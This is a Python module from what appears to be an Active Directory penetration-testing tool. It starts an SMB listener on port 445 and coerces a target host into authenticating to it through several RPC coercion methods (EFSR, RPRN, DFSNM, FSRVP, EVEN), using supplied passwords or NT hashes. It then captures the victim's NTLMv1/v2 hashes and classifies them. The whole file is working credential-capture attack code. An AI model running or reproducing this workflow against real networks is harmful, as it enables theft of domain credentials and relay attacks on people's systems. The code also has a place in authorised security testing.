"""Reusable NTLM capture workflows for listeners and coercion triggers.

This module provides a small orchestration layer for workflows that need to:

- start an async SMB capture listener in the background
- trigger outbound authentication with ADscan's native async coercion stack
- observe the capture queue and classify NTLMv1 vs NTLMv2

The listener is the native ``SMBNtlmCaptureSource`` from
``services.relay.smb_ntlm_capture``; this module wraps it behind a
synchronous ``start()/stop()/wait_for_capture()`` interface for callers that
are not running on an asyncio event loop.
"""

from __future__ import annotations

import asyncio
from dataclasses import dataclass
import subprocess
import time
from typing import Callable, Iterable

import queue as _queue
import threading

from aiosmb.commons.connection.factory import SMBConnectionFactory

from adscan_internal.services.async_bridge import run_async_sync
from adscan_internal.services.coercion.runner import (
    NativeCoercionRunConfig,
    run_native_coercion,
)


RunCommand = Callable[..., subprocess.CompletedProcess[str] | None]


def looks_like_ntlm_hash(value: str) -> bool:
    """Return whether ``value`` looks like a bare NT hash.

    Delegates to the central
    :func:`adscan_internal.services.credential_routing.looks_like_ntlm_hash`
    so the format definition stays single-sourced. Re-exported here as a
    backward-compat alias for existing callers in this module.
    """
    from adscan_internal.services.credential_routing import (
        looks_like_ntlm_hash as _central,
    )

    return _central(value)


@dataclass(frozen=True)
class NtlmCaptureObservation:
    """A single NTLM authentication capture observed by the listener."""

    raw_user: str
    clean_user: str
    ntlm_version: str
    fullhash: str


@dataclass(frozen=True)
class NtlmCaptureProbeResult:
    """Result of a single coercion-to-capture workflow run."""

    success: bool
    auth_type: str | None
    observation: NtlmCaptureObservation | None
    reason: str | None
    trigger_command: list[str]
    trigger_auth_mode: str | None
    attempted_trigger_auth_modes: tuple[str, ...]
    trigger_returncode: int | None
    trigger_stdout: str
    trigger_stderr: str
    trigger_error_kind: str | None
    trigger_error_detail: str | None
    listener_returncode: int | None
    listener_expected_stop: bool


@dataclass(frozen=True)
class NativeCoercionExecution:
    """Outcome of one native coercion trigger attempt."""

    auth_mode: str
    command: list[str]
    returncode: int
    stdout: str
    stderr: str
    error_kind: str | None
    error_detail: str | None


class NativeCoercionTrigger:
    """Run ADscan native coercion as an NTLM capture trigger."""

    def run(
        self,
        *,
        target: str,
        listener_ip: str,
        username: str,
        secret: str,
        domain: str,
        timeout_seconds: int,
        auth_type: str = "smb",
        dc_ip: str | None = None,
        method_filter: str | None = None,
        use_kerberos: bool = False,
        env: dict[str, str] | None = None,
    ) -> NativeCoercionExecution:
        """Execute native coercion and return subprocess-like metadata."""

        del env
        command = _native_trigger_command(
            target=target,
            listener_ip=listener_ip,
            domain=domain,
            auth_type=auth_type,
            method_filter=method_filter,
            use_kerberos=use_kerberos,
        )
        try:
            result = run_async_sync(
                _run_native_coercion_trigger(
                    target=target,
                    listener_ip=listener_ip,
                    username=username,
                    secret=secret,
                    domain=domain,
                    timeout_seconds=timeout_seconds,
                    auth_type=auth_type,
                    dc_ip=dc_ip,
                    method_filter=method_filter,
                    use_kerberos=use_kerberos,
                )
            )
        except Exception as exc:  # noqa: BLE001 - converted to structured probe result
            return NativeCoercionExecution(
                auth_mode="kerberos" if use_kerberos else "smb",
                command=command,
                returncode=1,
                stdout="",
                stderr=str(exc),
                error_kind=type(exc).__name__,
                error_detail=str(exc),
            )

        summary = (
            f"native coercion success={result.success} attempts={result.attempts} "
            f"timed_out={result.timed_out}"
        )
        if result.success:
            first = result.successful_results[0]
            summary += f" method={first.protocol}/{first.method_name}"
        else:
            failures = [
                f"{attempt.protocol}/{attempt.method_name}:{attempt.error or attempt.error_code or 'failed'}"
                for attempt in result.results[:5]
            ]
            if failures:
                summary += " failures=" + "; ".join(failures)

        return NativeCoercionExecution(
            auth_mode="kerberos" if use_kerberos else "smb",
            command=command,
            returncode=0 if result.success else 1,
            stdout=summary,
            stderr="",
            error_kind=None if result.success else "coercion_not_triggered",
            error_detail=None if result.success else summary,
        )


def _normalize_expected_usernames(values: Iterable[str]) -> set[str]:
    """Normalize candidate usernames for case-insensitive comparisons."""

    normalized: set[str] = set()
    for value in values:
        candidate = str(value or "").strip()
        if candidate:
            normalized.add(candidate.casefold())
    return normalized


async def _run_native_coercion_trigger(
    *,
    target: str,
    listener_ip: str,
    username: str,
    secret: str,
    domain: str,
    timeout_seconds: int,
    auth_type: str,
    dc_ip: str | None,
    method_filter: str | None,
    use_kerberos: bool,
):
    secret_type = "nt" if looks_like_ntlm_hash(secret) else "password"
    # When Kerberos auth is requested, aiosmb derives the ``cifs/<target>`` SPN
    # from this very ``target`` argument. A short hostname or IP yields a
    # ticket the server rejects (same pattern as LDAP/SMB); promote to FQDN.
    if use_kerberos:
        from adscan_internal.services._kerberos_spn import (
            normalize_kerberos_target_hostname,
        )

        spn_target = normalize_kerberos_target_hostname(target, domain) or target
    else:
        spn_target = target
    factory = SMBConnectionFactory.from_components(
        spn_target,
        username,
        secret,
        secrettype=secret_type,
        domain=domain,
        dcip=dc_ip or target,
        authproto="kerberos" if use_kerberos else "ntlm",
    )
    protocols, method_names = _native_filter_from_method(method_filter)
    return await run_native_coercion(
        connection_factory=factory,
        target_host=target,
        config=NativeCoercionRunConfig(
            listener_host=listener_ip,
            listener_auth_type="http" if auth_type.lower() == "http" else "smb",
            timeout_seconds=float(timeout_seconds),
            stop_on_first_success=True,
            protocols=protocols,
            method_names=method_names,
            show_summary=False,
        ),
    )


def _native_filter_from_method(
    method_filter: str | None,
) -> tuple[tuple[str, ...], tuple[str, ...]]:
    candidate = str(method_filter or "").strip()
    if not candidate:
        return ("EFSR", "RPRN"), ()
    normalized = candidate.upper().replace("MS-", "")
    if normalized in {"EFSR", "RPRN", "DFSNM", "FSRVP", "EVEN"}:
        return (normalized,), ()
    return (), (candidate,)


def _native_trigger_command(
    *,
    target: str,
    listener_ip: str,
    domain: str,
    auth_type: str,
    method_filter: str | None,
    use_kerberos: bool,
) -> list[str]:
    command = [
        "adscan-native-coercion",
        "--target",
        target,
        "--listener",
        listener_ip,
        "--domain",
        domain,
        "--auth-type",
        auth_type,
    ]
    if method_filter:
        command.extend(["--method", method_filter])
    if use_kerberos:
        command.append("--kerberos")
    return command


class NativeListenerCapture:
    """SMB relay listener backed by ``aiosmb`` for active coercion capture.

    Exposes a synchronous ``start() / stop() / wait_for_capture()`` interface
    that runs the async ``SMBNtlmCaptureSource`` on a background asyncio event
    loop in a dedicated thread and bridges captured NTLM observations to a
    ``threading.Queue`` for synchronous consumption.
    """

    exit_returncode: int | None = None
    exit_expected_stop: bool = False

    def __init__(
        self,
        *,
        listen_host: str = "0.0.0.0",
        listen_port: int = 445,
    ) -> None:
        self.listen_host = listen_host
        self.listen_port = listen_port
        self._capture_queue: _queue.Queue[NtlmCaptureObservation] = _queue.Queue()
        self._thread: threading.Thread | None = None
        self._loop: asyncio.AbstractEventLoop | None = None
        self._stop_event: asyncio.Event | None = None

    def clear_database(self) -> None:
        """No-op — native listener has no persistent state to clear."""

    def start(self) -> bool:
        """Start the SMB relay listener in a background thread."""

        ready_event = threading.Event()
        error_holder: list[Exception] = []

        def _run_loop() -> None:
            loop = asyncio.new_event_loop()
            self._loop = loop
            asyncio.set_event_loop(loop)
            try:
                loop.run_until_complete(self._async_main(ready_event, error_holder))
            finally:
                loop.close()

        self._thread = threading.Thread(target=_run_loop, daemon=True, name="native-smb-listener")
        self._thread.start()
        ready_event.wait(timeout=5.0)
        if error_holder:
            return False
        return True

    async def _async_main(
        self,
        ready_event: threading.Event,
        error_holder: list[Exception],
    ) -> None:
        from adscan_internal.services.relay.smb_ntlm_capture import (  # noqa: PLC0415
            SMBNtlmCaptureConfig,
            SMBNtlmCaptureSource,
            extract_ntlm_hash,
        )

        config = SMBNtlmCaptureConfig(listen_host=self.listen_host, listen_port=self.listen_port)
        gssapi_queue: asyncio.Queue[object] = asyncio.Queue()
        source = SMBNtlmCaptureSource(config, gssapi_queue)
        self._stop_event = asyncio.Event()

        try:
            await source.start()
        except Exception as exc:  # noqa: BLE001
            error_holder.append(exc)
            ready_event.set()
            return

        ready_event.set()

        try:
            while not self._stop_event.is_set():
                try:
                    gssapi = await asyncio.wait_for(gssapi_queue.get(), timeout=0.5)
                except asyncio.TimeoutError:
                    continue

                result = extract_ntlm_hash(gssapi)
                if result is None:
                    continue

                raw_user = (
                    f"{result.domain}\\{result.username}"
                    if result.domain and result.username
                    else (result.username or "")
                )
                self._capture_queue.put(
                    NtlmCaptureObservation(
                        raw_user=raw_user,
                        clean_user=result.username or "",
                        ntlm_version=result.ntlm_version,
                        fullhash=result.fullhash,
                    )
                )
        finally:
            await source.stop()

    def stop(self) -> None:
        """Stop the background listener."""

        if self._loop is not None and self._stop_event is not None:
            self._loop.call_soon_threadsafe(self._stop_event.set)
        if self._thread is not None:
            self._thread.join(timeout=5.0)

    def wait_for_capture(
        self,
        *,
        timeout_seconds: int,
        expected_usernames: Iterable[str] | None = None,
        poll_interval_seconds: float = 1.0,
    ) -> NtlmCaptureObservation | None:
        """Wait for the first matching NTLM capture from the native listener."""

        deadline = time.time() + max(timeout_seconds, 1)
        expected = _normalize_expected_usernames(expected_usernames or [])

        while time.time() < deadline:
            remaining = deadline - time.time()
            try:
                obs = self._capture_queue.get(timeout=min(poll_interval_seconds, max(remaining, 0.01)))
            except _queue.Empty:
                continue

            if expected and obs.clean_user.casefold() not in expected:
                continue
            return obs

        return None


def run_ntlm_capture_probe(
    *,
    listener: NativeListenerCapture,
    trigger: NativeCoercionTrigger,
    target: str,
    listener_ip: str,
    username: str,
    secret: str,
    domain: str,
    expected_usernames: Iterable[str],
    capture_timeout_seconds: int,
    trigger_timeout_seconds: int,
    auth_type: str = "smb",
    trigger_auth_mode: str = "smb",
    trigger_env: dict[str, str] | None = None,
    dc_ip: str | None = None,
    method_filter: str | None = None,
    listener_ready_delay_seconds: float = 2.0,
    post_trigger_wait_seconds: float = 2.0,
    sleep_fn: Callable[[float], None] = time.sleep,
) -> NtlmCaptureProbeResult:
    """Run a coercion-to-capture probe and classify the observed NTLM auth type."""

    if not listener.start():
        return NtlmCaptureProbeResult(
            success=False,
            auth_type=None,
            observation=None,
            reason="listener_start_failed",
            trigger_command=[],
            trigger_auth_mode=None,
            attempted_trigger_auth_modes=(),
            trigger_returncode=None,
            trigger_stdout="",
            trigger_stderr="",
            trigger_error_kind=None,
            trigger_error_detail=None,
            listener_returncode=None,
            listener_expected_stop=False,
        )

    trigger_command: list[str] = []
    trigger_result: NativeCoercionExecution | None = None
    trigger_error_kind: str | None = None
    trigger_error_detail: str | None = None
    try:
        listener.clear_database()
        sleep_fn(max(listener_ready_delay_seconds, 0.0))
        trigger_execution = trigger.run(
            target=target,
            listener_ip=listener_ip,
            username=username,
            secret=secret,
            domain=domain,
            timeout_seconds=trigger_timeout_seconds,
            auth_type=auth_type,
            use_kerberos=trigger_auth_mode == "kerberos",
            env=trigger_env,
            dc_ip=dc_ip,
            method_filter=method_filter,
        )
        trigger_command = trigger_execution.command
        trigger_result = trigger_execution
        trigger_error_kind = trigger_execution.error_kind
        trigger_error_detail = trigger_execution.error_detail
        sleep_fn(max(post_trigger_wait_seconds, 0.0))
        observation = listener.wait_for_capture(
            timeout_seconds=capture_timeout_seconds,
            expected_usernames=expected_usernames,
        )
    finally:
        listener.stop()

    if observation is not None:
        return NtlmCaptureProbeResult(
            success=True,
            auth_type=observation.ntlm_version,
            observation=observation,
            reason=None,
            trigger_command=trigger_command,
            trigger_auth_mode=trigger_auth_mode,
            attempted_trigger_auth_modes=(trigger_auth_mode,),
            trigger_returncode=(
                trigger_result.returncode if trigger_result is not None else None
            ),
            trigger_stdout=trigger_result.stdout if trigger_result else "",
            trigger_stderr=trigger_result.stderr if trigger_result else "",
            trigger_error_kind=trigger_error_kind,
            trigger_error_detail=trigger_error_detail,
            listener_returncode=listener.exit_returncode,
            listener_expected_stop=listener.exit_expected_stop,
        )

    reason = "capture_not_observed"
    if listener.exit_returncode is not None and not listener.exit_expected_stop:
        reason = "listener_exited_during_capture"

    return NtlmCaptureProbeResult(
        success=False,
        auth_type=None,
        observation=None,
        reason=reason,
        trigger_command=trigger_command,
        trigger_auth_mode=trigger_auth_mode,
        attempted_trigger_auth_modes=(trigger_auth_mode,),
        trigger_returncode=(
            trigger_result.returncode if trigger_result is not None else None
        ),
        trigger_stdout=trigger_result.stdout if trigger_result else "",
        trigger_stderr=trigger_result.stderr if trigger_result else "",
        trigger_error_kind=trigger_error_kind,
        trigger_error_detail=trigger_error_detail,
        listener_returncode=listener.exit_returncode,
        listener_expected_stop=listener.exit_expected_stop,
    )
